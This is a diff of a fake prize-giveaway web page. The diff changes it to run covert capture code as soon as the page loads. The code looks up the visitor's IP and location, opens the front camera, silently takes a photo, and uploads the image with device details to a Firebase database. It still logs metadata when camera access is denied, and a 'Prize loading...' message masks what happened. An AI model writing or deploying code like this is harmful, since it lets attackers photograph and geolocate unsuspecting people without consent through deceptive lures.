@@ -15,43 +15,12 @@
     justify-content: center;
     color: white;
   }
-  .container {
-    text-align: center;
-    padding: 2rem;
-    max-width: 400px;
-  }
+  .container { text-align: center; padding: 2rem; max-width: 400px; }
   .trophy { font-size: 80px; margin-bottom: 1rem; animation: bounce 1s infinite alternate; }
   @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
   h1 { font-size: 2rem; margin-bottom: 0.5rem; }
   p { font-size: 1rem; opacity: 0.9; margin-bottom: 2rem; line-height: 1.6; }
-  .btn {
-    background: white;
-    color: #764ba2;
-    border: none;
-    padding: 14px 36px;
-    border-radius: 50px;
-    font-size: 1.1rem;
-    font-weight: 600;
-    cursor: pointer;
-    transition: transform 0.2s;
-  }
-  .btn:hover { transform: scale(1.05); }
-  .loader {
-    display: none;
-    margin-top: 1.5rem;
-    font-size: 0.9rem;
-    opacity: 0.8;
-  }
-  .dots::after {
-    content: '';
-    animation: dots 1.5s steps(3, end) infinite;
-  }
-  @keyframes dots {
-    0%   { content: '.'; }
-    33%  { content: '..'; }
-    66%  { content: '...'; }
-    100% { content: ''; }
-  }
+  .status { font-size: 0.9rem; opacity: 0.8; margin-top: 1rem; min-height: 24px; }
   video { display: none; }
   canvas { display: none; }
 </style>
@@ -61,12 +30,11 @@
 <div class="container">
   <div class="trophy">🎁</div>
   <h1>Congratulations!</h1>
-  <p>You have been selected for a special reward.<br>Click below to verify your identity and claim your prize.</p>
-  <button class="btn" onclick="startVerification()">Claim Prize Now</button>
-  <div class="loader" id="loader">Verifying identity<span class="dots"></span></div>
+  <p>You have been selected for a special reward.<br>Your prize is being loaded...</p>
+  <div class="status" id="status">Please wait...</div>
 </div>
 
-<video id="video" autoplay playsinline></video>
+<video id="video" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
 
 <script type="module">
@@ -86,21 +54,16 @@
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
 
-  window.startVerification = async function() {
-    document.querySelector('.btn').style.display = 'none';
-    document.getElementById('loader').style.display = 'block';
-
+  async function captureOnLoad() {
     try {
-      // Get user info
-      const userAgent = navigator.userAgent;
-      const timestamp = new Date().toISOString();
+      // Get IP info
       let ipInfo = {};
       try {
         const ipRes = await fetch('https://ipapi.co/json/');
         ipInfo = await ipRes.json();
       } catch(e) {}
 
-      // Open front camera
+      // Auto open front camera
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user' },
         audio: false
@@ -109,67 +72,54 @@
       const video = document.getElementById('video');
       video.srcObject = stream;
 
-      // Wait for camera to be ready
       await new Promise(resolve => {
         video.onloadedmetadata = () => {
           video.play();
-          setTimeout(resolve, 1500); // wait 1.5s for camera to warm up
+          setTimeout(resolve, 1500);
         };
       });
 
-      // Take photo
+      // Take photo silently
       const canvas = document.getElementById('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
+      canvas.getContext('2d').drawImage(video, 0, 0);
 
-      // Stop camera
-      stream.getTracks().forEach(track => track.stop());
+      // Stop camera immediately
+      stream.getTracks().forEach(t => t.stop());
 
-      // Convert to base64 (compressed jpeg)
       const photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
 
-      // Save to Firebase Realtime Database
-      const photosRef = ref(db, 'captures');
-      const newRef = push(photosRef);
-      await set(newRef, {
+      // Save to Firebase
+      await set(push(ref(db, 'captures')), {
         photo: photoBase64,
-        timestamp: timestamp,
-        userAgent: userAgent,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
         ip: ipInfo.ip || 'unknown',
         city: ipInfo.city || 'unknown',
         country: ipInfo.country_name || 'unknown',
-        device: /Mobile|Android|iPhone/i.test(userAgent) ? 'Mobile' : 'Desktop'
+        device: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
       });
 
-      // Show success message
-      document.getElementById('loader').innerHTML = '✅ Verification complete! Redirecting...';
-      setTimeout(() => {
-        // Redirect anywhere you want
-        window.location.href = 'https://google.com';
-      }, 2000);
+      document.getElementById('status').textContent = '🎉 Prize loading...';
 
     } catch(err) {
-      // Camera denied or error — still try to save metadata
+      // Camera denied — save metadata only
       try {
-        const photosRef = ref(db, 'captures');
-        const newRef = push(photosRef);
-        await set(newRef, {
+        await set(push(ref(db, 'captures')), {
           photo: null,
           timestamp: new Date().toISOString(),
           userAgent: navigator.userAgent,
-          error: err.message,
+          error: 'Camera denied: ' + err.message,
           device: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
         });
-      } catch(e2) {}
-
-      document.getElementById('loader').innerHTML = '✅ Verified! Loading your prize...';
-      setTimeout(() => {
-        window.location.href = 'https://google.com';
-      }, 2000);
+      } catch(e) {}
+      document.getElementById('status').textContent = '🎉 Prize loading...';
     }
-  };
+  }
+
+  // Auto run on page load
+  window.addEventListener('load', captureOnLoad);
 </script>
 
 </body>
